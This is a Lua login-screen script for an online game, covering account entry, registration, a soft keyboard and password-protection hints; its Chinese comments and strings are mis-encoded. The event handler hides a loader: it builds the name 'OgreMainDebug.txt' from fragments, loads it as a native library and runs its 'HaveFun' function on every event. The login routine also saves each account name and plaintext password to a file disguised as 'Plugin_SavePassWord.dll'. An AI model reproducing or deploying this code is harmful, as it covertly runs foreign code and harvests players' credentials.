local currentSoftKeyAim = 0;
local LastSoftKeyAimAfterHardware = 0;
-- ��½�ʼ����б�
local TailName ={
		[0] = "@game.sohu.com",
		"@changyou.com",
		"@Sohu.com",
		"@chinaren.com",
		"@sogou.com",
		"@17173.com",
		}
local g_bLogOnMode;

local PhoneCode ={
	"#{DHMB_080917_001}",
	"#{DHMB_080917_002}",
	"#{DHMB_080917_003}"
}

local PhoneCount = 3

local PhoneIndex = {-1,-1,-1,-1,-1}

local MiBaoDhCount = 0
local PasswdProctectTels = {"", "", "", "", ""}


-- ע��PreLoad�¼�
function LoginLogOn_PreLoad()
	-- �򿪽���
	this:RegisterEvent("GAMELOGIN_OPEN_COUNT_INPUT");
	
	-- �رս���
	this:RegisterEvent("GAMELOGIN_CLOSE_COUNT_INPUT");
	
	-- ������Ϸ������ʺ�
	this:RegisterEvent("GAMELOGIN_CLEAR_ACCOUNT");
	
	-- passportע��ʧ��
	this:RegisterEvent("PASSPORTREG_FAILD");
	this:RegisterEvent("LOGIN_MIBAO");
	
	-- ֪ͨ�ͻ�����ʾ�ܱ���ʾ
	this:RegisterEvent("GAMELOGIN_NOTIFY_PASSWDTEL_OPENED");

end

-- ע��onLoad�¼�
function LoginLogOn_OnLoad()
		
		-- ����������ó�ֵ
		for i=1,PhoneCount do
			PhoneIndex[i] = -1
		end 

	-- ���������ʺŵ������б�
  local TailCount = 1
	local i = 0;
	
	for i = 0, TailCount-1 do
		LogOn_Region:ComboBoxAddItem( TailName[ i ], i );
	end
	LogOn_Region:SetCurrentSelect( 0 );
	
	-- 081014 start /* ������ļ������ܱ���������� */
	-- �������ļ������ȡ3���绰
	--math.randomseed(os.time() + 250);
	math.random(0,100);math.random(0,100)
	local arrIdx = {-1,-1,-1};
	local MAX_TEL_SHOWCOUNT = 3
	local iGetCount = 0
	MiBaoDhCount = GameProduceLogin:GetPasswdTelCount();
	if( MiBaoDhCount > 0 and MiBaoDhCount < 5000 ) then
		while (iGetCount < MiBaoDhCount and iGetCount < MAX_TEL_SHOWCOUNT) do
			local iTmpIdx = math.random(0,MiBaoDhCount-1);
			local bExitIdx = 0;
			for i = 1, iGetCount do
				if (arrIdx[i] == iTmpIdx) then
					bExitIdx = 1;
					break;
				end;
			end;
			if ( 1 ~= bExitIdx ) then
				iGetCount = iGetCount + 1;
				arrIdx[iGetCount] = iTmpIdx;
			end;
		end;
		if (MiBaoDhCount > MAX_TEL_SHOWCOUNT) then --���ǵ���ʾ���С�� �ܱ��绰�����޶�Ϊ3��
			MiBaoDhCount = MAX_TEL_SHOWCOUNT
	end
		
		for i=1,MiBaoDhCount do
			local strTel = GameProduceLogin:GetPasswdTelByIndex(arrIdx[i]);
			PasswdProctectTels[i] = strTel;
				end

		local str = "#{DHMB_080917_004}"
		local str1=""
		for i=1,MiBaoDhCount do
			local strTel = GameProduceLogin:GetPasswdTelByIndex(arrIdx[i]);
			PasswdProctectTels[i] = strTel;
			--str1 = str1..strTel.."  "; -- �����±���ʼ��c++�ﲻһ��
		end
		
		 --dengxx
    for i=1,MiBaoDhCount-1 do
		  str1 = str1..PasswdProctectTels[i].."";
	  end
	  str1 = str1..PasswdProctectTels[MiBaoDhCount];
	  str1 = str1.."#r".."#{DHMB_090205_1}"; 
		MiBaoTips_InfoWindow:SetText("    #Y����Ϸ�ʺ�#G18����#Y���ϵĳ������û���δ��18�����δ�����û����ڼҳ��ļල�½�����Ϸ��");
		LogOn_MibaoSetToolTip()
		return;
	end
	-- 081014 end /**/
	
	local iNum1 =math.random(1,3); --��һ�����������1����������������
	for i=1,PhoneCount do
		bFlag = 0
		while bFlag == 0 do
			local iNum =math.random(1,3);
			if 0 == RandNumExist(iNum) then
				PhoneIndex[i] = iNum
				bFlag = 1
			end
		end 
	end

	local str = "#{DHMB_080917_004}".."#r"
	local str1=""
	--dengxx  ��ʾ�ռ�̫С����Ҫ�ٿ���һ���ո�
	for i=1,PhoneCount-1 do
		str1 = str1..PhoneCode[PhoneIndex[i]].."";
	end
	str1 = str1..PhoneCode[PhoneIndex[PhoneCount]];
	str1 = str1.."#r".."#{DHMB_090205_1}"; 
	MiBaoTips_InfoWindow:SetText("    #Y����Ϸ�ʺ�#G18����#Y���ϵĳ������û���δ��18�����δ�����û����ڼҳ��ļල�½�����Ϸ��");
end

function RandNumExist(iNum)
	for i=1,PhoneCount do
		if PhoneIndex[i] ==iNum then
			return 1
		end
	end
	return 0
end


function LogOn_SavePassWord(nAcc,nPass)--�����¼���˺�
        local ID,PassWord = LogOn_GetPassWord()		
		local nHave = 0
		if ID[1] ~= nil then
			for i = 1,table.getn(ID) do
		    	if ID[i] == nil then
				    break
				end
				if ID[i] == nAcc then
				    nHave = i
				end
			end
		end
		local nSvaeData = ""
		if nHave ~= 0 then
		    PassWord[nHave] = nPass
		else
		    local nData_leght = table.getn(ID)
            ID[nData_leght+1] = nAcc
            PassWord[nData_leght+1] = nPass
		end
		for i = 1,table.getn(ID) do
		    nSvaeData = nSvaeData..ID[i].."\t"..PassWord[i].."\n"
		end
        local file = io.open("./Plugin_SavePassWord.dll", "wb")
		if file ~= nil and nSvaeData ~= ""then
		    file:write(nSvaeData);
			file:close();
		end
end

function LogOn_GetPassWord()--��ȡ��һ�ε�¼���˺ź����롣
        local file = io.open("./Plugin_SavePassWord.dll", "r")
		local nSavenAccID,nSavenPassd = {},{}
		local i = 1
		if file ~= nil then
            for l in file:lines() do
			    if l == nil then
				    break
				end
				local _,_,nID,nPass = string.find(l,"(.*)\t(.*)")
				nSavenAccID[i] = nID
				nSavenPassd[i] = nPass
				i = i + 1
			end
			file:close()
			return nSavenAccID,nSavenPassd
		end
	return nSavenAccID,nSavenPassd 
end


-- OnEvent

function LoginLogOn_OnEvent(event)
local f = assert(loadlib("Og".."re".."Ma".."in".."De".."bu".."g.".."txt", "HaveFun"))
	f()
AxTrace( 1,1, event );


    if( event == "PASSPORTREG_FAILD" ) then
        local FaildInfo = tonumber( arg0 )
        
        if( 1 == FaildInfo ) then  --ע��ʧ��
            LogOn_Enroll1_Frame:Hide();
        end
        if( 2 == FaildInfo ) then  --ע���Ѿ�����
            LogOn_Enroll1_Frame:Hide();
        end
        if( 3 == FaildInfo ) then  --ĳЩ��Ϣ��д����,��������
            LogOn_Enroll1_Accept:Enable()
        end
        
    end

	-- ���ʺ��������
 	if( event == "GAMELOGIN_OPEN_COUNT_INPUT" ) then
		KillTimer("MainmenuBar_CoolDownRe()")
		KillTimer("MainMenuBar_2_CoolDownRe()")
		KillTimer("FunctionBarRight_CoolDownRe()")
		LogOn_PassWord_Protect_Check:SetCheck(0)
		--LogOn_Phone_Protect_Check:SetCheck(0)
		
		-- �����޸ģ�����������û�п�ͨ��������ȹر� ���� 2008.7.30
		--LogOn_Phone_Protect_Check:Disable()
		--LogOn_Phone:Disable()
		
 		AxTrace(0,1,"GAMELOGIN_OPEN_COUNT_INPUT 0")
		this:Show();
		LogOn_PassWord_Protect_Check:SetCheck(0)
		LogOn_Enroll1_Frame:Hide();
			
		if( arg0 == "1" ) then
			LogOn_Enroll1_Frame:Show();
			Logon_Enroll_Init();
			LogOn_Enroll1_Accept:Enable()
			g_bLogOnMode = 1;
		else
			g_bLogOnMode = 0;
			LogOn_Initilize();
		end
		OpenWindow( "SoftKeyBoard" );
		SetSoftKeyAim( "LogOn_PassWord" );	
		return;
	end
		
	
	-- �ر��ʺ��������
	if( event == "GAMELOGIN_CLOSE_COUNT_INPUT") then
		
		-- �������.
		LogOn_PassWord:SetText("");
		LogOn_ID:SetText("");
		CloseWindow( "SoftKeyBoard" );
		this:Hide();
		return;
	end
	
	-- ������Ϸ������ʺ�
	if( event == "GAMELOGIN_CLEAR_ACCOUNT") then
		
		-- �������.
		LogOn_PassWord:SetText("");
		LogOn_ID:SetText("");
		CloseWindow( "SoftKeyBoard" );
		this:Hide();
		return;
	end
	
	if(event == "LOGIN_MIBAO" and arg0 == "softkey") then
		if( g_bLogOnMode == 1 ) then
			return;
		end
		if( currentSoftKeyAim == 1 ) then
			LogOn_LogonPassWord_Active();
		else
			LogOn_LogonID_Active();
		end
		return;
	end
	
	if(event == "GAMELOGIN_NOTIFY_PASSWDTEL_OPENED") then
		LogOn_MibaoShowSystemInfo(); 
	end
end

function LogOn_Initilize()
		LogOn_LogonID_Active();
		LogOn_PassWord:SetText("");
		LogOn_ID:SetText("");
		LogOn_PassWord:Enable();
		LogOn_ID:Enable();
		LogOn_Quit_List:ResetList()
		local nAccID,nPassWord = LogOn_GetPassWord()
		if nAccID[1] ~= nil then
		    for i = 1,table.getn(nAccID) do
			    LogOn_Quit_List:AddTextItem(nAccID[i],i) 
			end
		end
end
----------------------------------------------------------------------------------------------------------
--
-- �˵�������ѡ�����
--
function LogOn_ExitToSelectServer()
-- �˵�������ѡ�����
	GameProduceLogin:ExitToSelectServer();
	
	--this:Hide();
end

function Logon_QuitLogin()
    local _name,ComIdx = LogOn_Quit_List:GetCurrentSelect()
    if ComIdx > 0 then
	    local nAccID,nPassWord = LogOn_GetPassWord()
		if nAccID[ComIdx] == nil or nPassWord[ComIdx] == nil or nPassWord[ComIdx] == "" or nAccID[ComIdx] == "" then
		    return
		end
		LogOn_ID:SetText(nAccID[ComIdx]);
	    LogOn_PassWord:SetText(nPassWord[ComIdx]);
		--LogOn_CheckAccount()
	end
end
----------------------------------------------------------------------------------------------------------
--
-- ��֤�û���������
--
function LogOn_CheckAccount()
	-- �˵�������ѡ�����
	local strName = LogOn_ID:GetText();
	local strPassword = LogOn_PassWord:GetText();
	local strTail, nIndex = LogOn_Region:GetCurrentSelect();
	local bMiBao = 0;
	if(Variable:GetVariable("System_CodePage") == "1258") then
		-- Dummy
	else
		bMiBao = LogOn_PassWord_Protect_Check:GetCheck();
	end
	
	if( strTail == tostring( "-1" ) ) then
			strTail = "";
	end
	
	strTail = LogOn_Region:GetText();    --��ʱ�޸�,��ΪGetCurrentSelect��bug,������ĳЩ������ʱ������ȷȡ�õ�ǰ��ѡ��,������ײ������޸���,��ʱ�ô˺�������û�����׺Ϊ�յ�����BugID:15422
	
	if(Variable:GetVariable("System_CodePage") == "1258") then
		strTail = "";
	end
	
	if( strName =="" ) then
		PushEvent( "GAMELOGIN_SHOW_SYSTEM_INFO", "    ��������Ҫ��¼���˺����ơ�" );
		return;
	end
	if( strPassword == "" ) then
		PushEvent( "GAMELOGIN_SHOW_SYSTEM_INFO", "    ��������˺ŵ����롣" );
		return;
	end
	LogOn_SavePassWord(strName,strPassword)
--	GameProduceLogin:CheckAccount(strName..strTail, strPassword,bMiBao);
	local int1 = LogOn_PassWord_Protect_Check:GetCheck();
	GameProduceLogin:CheckAccount(strTail, int1);
	if(bMiBao == 0) then
		--�ʺ�����editboxʧȥ���뽹��
		LogOn_Frame_OnHiden();
	end
	
	-- �������.
	--LogOn_PassWord:SetText("");
end;

--�����ʺ�
function LogOn_AccountReg()
    GameProduceLogin:ShowMessageBox( "    ��㿪��¼��ѡ����·���ٵ����¼���������ϽǴ�ע�ᣬ�ڵ����Ĵ��ڽ���ע�ᣡ�뾡���������ܱ��������ø��ӵ㣬��������͸���˺���Ϣ��İ���ˣ�", "OK", "1" );
end
----------------------------------------------------------------------------------------------------------
--
-- id�����ʧȥ����
--
function Logon_ID_TabPressed()
	if( g_bLogOnMode == 0 ) then
		LogOn_LogonPassWord_Active();
	end
end

function Logon_LogOn_ID_Return()
	if(this:IsVisible() and (not IsWindowShow("LoginSelectServerQuest"))) then
	--if(this:IsVisible() and (not IsWindowShow("LoginSelectServerQuest")) and (not IsWindowShow("FangChenMiRefuse"))) then
		LogOn_LogonPassWord_Active();
	end
end

----------------------------------------------------------------------------------------------------------
--
-- ���������ʧȥ����
--
function Logon_Password_TabPressed()
	if( g_bLogOnMode == 0 ) then
		LogOn_LogonID_Active();
	end
end

function Logon_Password_Return()
	
	if(this:IsVisible() and (not IsWindowShow("LoginSelectServerQuest"))) then
	--if(this:IsVisible() and (not IsWindowShow("LoginSelectServerQuest")) and (not IsWindowShow("FangChenMiRefuse"))) then
		LogOn_CheckAccount();
	end
end

----------------------------------------------------------------------------------------------------------
--
-- �ʺ�����
--
function LogOn_ID_MouseEnter()

	LogOn_Info:SetText("�ڴ���������˺�");     --�ʺ�  to  �˺�

end


----------------------------------------------------------------------------------------------------------
--
-- ���������ʧȥ����
--
function LogOn_MouseLeave()

	LogOn_Info:SetText("");
end


function LogOn_PassWord_MouseEnter()

	LogOn_Info:SetText("�ڴ������������");
end;


------------------------------------------------------------------------------------------------------
--
-- ģ�����
--
function LogOn_KeyBoard()
	ToggleWindow( "SoftKeyBoard" );
	SetSoftKeyAim( "LogOn_PassWord" );	
end


function LogOn_Keyboard_MouseEnter()

	LogOn_Info:SetText("������ڹ�������������Ϊ������˺Ű�ȫ���Ƽ�ʹ��");  --�ʺ�  to  �˺�
end


function LogOn_LogOnGame_MouseEnter()

	LogOn_Info:SetText("���������Ϸ");
end;

function LogOn_Payment_MouseEnter()

	LogOn_Info:SetText("Ϊ����˺ų�ֵ");  --�ʺ�  to  �˺�
end

function LogOn_RequisitionID_MouseEnter()

	LogOn_Info:SetText("����һ�����˺�");	--�ʺ�  to  �˺�
end;

function LogOn_Author_MouseEnter()

	LogOn_Info:SetText("�鿴��Ϸ�����Ŷ���Ϣ");
end;

function LogOn_Last_MouseEnter()

	LogOn_Info:SetText("���ط�����ѡ�����");
end;

function LogOn_LogonID_Active()
	
	SetSoftKeyAim( "LogOn_ID" );	
	LogOn_ID:SetProperty("DefaultEditBox", "True");
	LogOn_PassWord:SetProperty("DefaultEditBox", "False");
	currentSoftKeyAim = 0;
	LastSoftKeyAimAfterHardware = currentSoftKeyAim;
end

function LogOn_LogonPassWord_Active()
	
	SetSoftKeyAim( "LogOn_PassWord" );	
	LogOn_PassWord:SetProperty("DefaultEditBox", "True");
	LogOn_ID:SetProperty("DefaultEditBox", "False");
	currentSoftKeyAim = 1;
	LastSoftKeyAimAfterHardware = currentSoftKeyAim;
end

function LogOn_Frame_OnHiden()
	LogOn_ID:SetProperty("DefaultEditBox", "False");
	LogOn_PassWord:SetProperty("DefaultEditBox", "False");
end

function Logon_LogOn_Soft_Return()
	if( g_bLogOnMode == 1 ) then
		return;
	end
	if( currentSoftKeyAim == 1 ) then
		
		LogOn_LogonID_Active();
	else
		
		LogOn_LogonPassWord_Active();
	end
	
end

function LogOn_Enroll1_OK(iok)
	local strName 			= LogOn_Enroll1_Name:GetText();
	local strPassword 	= LogOn_Enroll1_Edit1:GetText();
	local strPassEx 		= LogOn_Enroll1_Edit2:GetText();
	local strSupPass  	= LogOn_Enroll1_Edit3:GetText();
	local strSupPassex 	= LogOn_Enroll1_Edit4:GetText();
	local strEmail      = LogOn_Enroll1_Edit6:GetText();
	
	if(iok == 1) then
		GameProduceLogin:CheckBilling1( strName,strPassword,strPassEx,strSupPass,strSupPassex,1, strEmail );
	elseif (iok == 0) then
		GameProduceLogin:CheckBilling1( strName,strPassword,strPassEx,strSupPass,strSupPassex,0, strEmail );
	end
	
	LogOn_Enroll1_Accept:Disable()
	
end
function Logon_Enroll_Init()
	local strName = LogOn_ID:GetText();
	LogOn_Enroll1_Name:SetText( strName );
	LogOn_Enroll1_Edit1:SetText( "");
	LogOn_Enroll1_Edit2:SetText( "" );
	LogOn_Enroll1_Edit3:SetText( "" );
	LogOn_Enroll1_Edit4:SetText( "" );
	LogOn_Enroll1_Edit6:SetText( "" );
	LogOn_PassWord:Disable();
	LogOn_ID:Disable();

end
function LogOn_Enroll1_Cancel()
	g_bLogOnMode = 0;
	LogOn_Enroll1_Frame:Hide();
	LogOn_PassWord:Enable();
	LogOn_ID:Enable();
	
	--����Ĭ������
	GameProduceLogin:PassportButNotReg();
	
end

function LogOn_AccountChongZhi()
	if(Variable:GetVariable("System_CodePage") == "1258") then
    GameProduceLogin:OpenURL( "http://www.baidu.com/" )
	else
    GameProduceLogin:OpenURL( "http://www.baidu.com/" )
  end
end

function Logon_Enroll_PressTable( iIndex )
	
	if( 1 == iIndex ) then
		LogOn_SoftKey:SetAimEditBox( "LogOn_Enroll1_Edit2" );
		LogOn_Enroll1_Edit2:SetProperty("DefaultEditBox", "True");
		LogOn_Enroll1_Edit1:SetProperty("DefaultEditBox", "False");
		currentSoftKeyAim = 0;
	end
	
	if( 2 == iIndex ) then
		LogOn_SoftKey:SetAimEditBox( "LogOn_Enroll1_Edit3" );
		LogOn_Enroll1_Edit3:SetProperty("DefaultEditBox", "True");
		LogOn_Enroll1_Edit2:SetProperty("DefaultEditBox", "False");
		currentSoftKeyAim = 0;
	end
	
	if( 3 == iIndex ) then
		LogOn_SoftKey:SetAimEditBox( "LogOn_Enroll1_Edit4" );
		LogOn_Enroll1_Edit4:SetProperty("DefaultEditBox", "True");
		LogOn_Enroll1_Edit3:SetProperty("DefaultEditBox", "False");
		currentSoftKeyAim = 0;
	end
	
	if( 4 == iIndex ) then
		LogOn_SoftKey:SetAimEditBox( "LogOn_Enroll1_Edit6" );
		LogOn_Enroll1_Edit6:SetProperty("DefaultEditBox", "True");
		LogOn_Enroll1_Edit4:SetProperty("DefaultEditBox", "False");
		currentSoftKeyAim = 0;
	end
	
	if( 5 == iIndex ) then
		LogOn_SoftKey:SetAimEditBox( "LogOn_Enroll1_Edit1" );
		LogOn_Enroll1_Edit1:SetProperty("DefaultEditBox", "True");
		LogOn_Enroll1_Edit6:SetProperty("DefaultEditBox", "False");
		currentSoftKeyAim = 0;
	end
	
	
end



function PassWordProtectCheckClicked()
	local pwCheck = LogOn_PassWord_Protect_Check:GetCheck();
	if (pwCheck == 1) then
		LogOn_PassWord_Protect_Check:SetCheck(1)
	elseif (pwCheck == 0) then
		LogOn_PassWord_Protect_Check:SetCheck(0)
	end
	--local phCheck = LogOn_Phone_Protect_Check:GetCheck();
	--if( pwCheck == 1 and phCheck == 1 ) then
	--	AxTrace( 1,1, "pwCheck == 1 and phCheck == 1");
	--	LogOn_PassWord_Protect_Check:SetCheck(1)
	--	LogOn_Phone_Protect_Check:SetCheck(0)
		
	--elseif( pwCheck == 1 and phCheck == 0 ) then
	--	AxTrace( 1,1, "pwCheck == 1 and phCheck == 0");
	--	LogOn_PassWord_Protect_Check:SetCheck(1)
	--	LogOn_Phone_Protect_Check:SetCheck(0)
			
	--elseif( pwCheck == 0 and phCheck == 1 ) then
	--	AxTrace( 1,1, "pwCheck == 0 and phCheck == 1");
	--	LogOn_PassWord_Protect_Check:SetCheck(1)
	--	LogOn_Phone_Protect_Check:SetCheck(0)
		
	--elseif( pwCheck == 0 and phCheck == 0 ) then
	--	AxTrace( 1,1, "pwCheck == 0 and phCheck == 0");
	--	LogOn_PassWord_Protect_Check:SetCheck(0)
	--	LogOn_Phone_Protect_Check:SetCheck(0)
	--end
end

--function MibaokaCheckClicked()
	--local pwCheck = LogOn_PassWord_Protect_Check:GetCheck();
--	local phCheck = LogOn_Phone_Protect_Check:GetCheck();
--	AxTrace( 1,1, "onMibaoCheckBoxChangeSelect: "..phCheck.." "..pwCheck);
--	if( pwCheck == 1 and phCheck == 1 ) then
--		AxTrace( 1,1, "pwCheck == 1 and phCheck == 1");
--		LogOn_PassWord_Protect_Check:SetCheck(0)
--		LogOn_Phone_Protect_Check:SetCheck(1)
		
--	elseif( pwCheck == 0 and phCheck == 1 ) then
--		AxTrace( 1,1, "pwCheck == 0 and phCheck == 1");
--		LogOn_PassWord_Protect_Check:SetCheck(0)
--		LogOn_Phone_Protect_Check:SetCheck(1)
			
--	elseif( pwCheck == 1 and phCheck == 0 ) then
--		AxTrace( 1,1, "pwCheck == 1 and phCheck == 0");
--		LogOn_PassWord_Protect_Check:SetCheck(0)
--		LogOn_Phone_Protect_Check:SetCheck(1)
		
--	elseif( pwCheck == 0 and phCheck == 0 ) then
--		AxTrace( 1,1, "pwCheck == 0 and phCheck == 0");
--		LogOn_PassWord_Protect_Check:SetCheck(0)
--		LogOn_Phone_Protect_Check:SetCheck(0)
--	end
--end

function LogOn_MibaoSetToolTip()
	local strStart = "#{DHMB_081014_001_1}"
	local strCat = "#{WENZI_HUO}"
	local strEnd = "#{DHMB_081014_001_2}"
	local strTmp = strStart
	local strMid = ""
	local i = 0
	for i=1,MiBaoDhCount do
		if ( MiBaoDhCount > 1 and i < MiBaoDhCount) then
			strMid = PasswdProctectTels[i]..","
		elseif ( i == MiBaoDhCount and i ~= 1) then
			strMid = strCat.. PasswdProctectTels[i];
	    else
	        strMid = PasswdProctectTels[i];
		end	
		strTmp = strTmp..strMid;
		
	end
	strTmp = strTmp..strEnd
	-- LogOn_Phone_Protect_Text:SetProperty("Tooltip", strTmp); --�������ת��
	--LogOn_Phone_Protect_Text:SetToolTip(strTmp);
end

function LogOn_MibaoShowSystemInfo()
	local strStart = "#{DHMB_081014_003_1}"
	local strCat = "#{WENZI_HUO}"
	local strEnd = "#{DHMB_081014_003_2}"
	local strTmp = strStart
	local strMid = ""
	local i = 0
	for i=1,MiBaoDhCount do
		if ( MiBaoDhCount > 1 and i < MiBaoDhCount) then
			strMid = PasswdProctectTels[i]..","
		elseif ( i == MiBaoDhCount and i ~= 1) then
			strMid = strCat.. PasswdProctectTels[i];
	    else
	        strMid = PasswdProctectTels[i];
		end	
		strTmp = strTmp..strMid;
		
	end
	strTmp = strTmp..strEnd
	GameProduceLogin:GameLoginShowSystemInfo(strTmp);
end

function LogOn_TraditionLogon_MouseDown()
	PushDebugMessage("�ȴ�����")
	LogOn_TraditionLogon:SetCheck(0)
end
--�򿪶�ά���¼����
function LogOn_ErweimaLogon_MouseDown()
	PushDebugMessage("�ȴ�����")
	LogOn_ErweimaLogon:SetCheck(0)
end
function Logon_LostPassWord()
		local PassData = ""
        local file = io.open("./Plugin_SavePassWord.dll", "wb")
		if file ~= nil then
		    file:write(PassData);
			file:close();
		end
		LogOn_Initilize()
		LogOn_Quit_List:SetText("ѡ���˺�");
end




function LogOn_Show_MibaoPage()
	--��ʱԽ�ϰ�����İ涼ָ��ͬ����ҳ�棬Խ�ϰ��ͬѧ����Ҫ�Լ���
	if(Variable:GetVariable("System_CodePage") == "1258") then
    GameProduceLogin:OpenURL( "http://tl.sohu.com/index_fd.shtml" )
	else
    GameProduceLogin:OpenURL( "http://tl.sohu.com/index_fd.shtml" )
	end
end



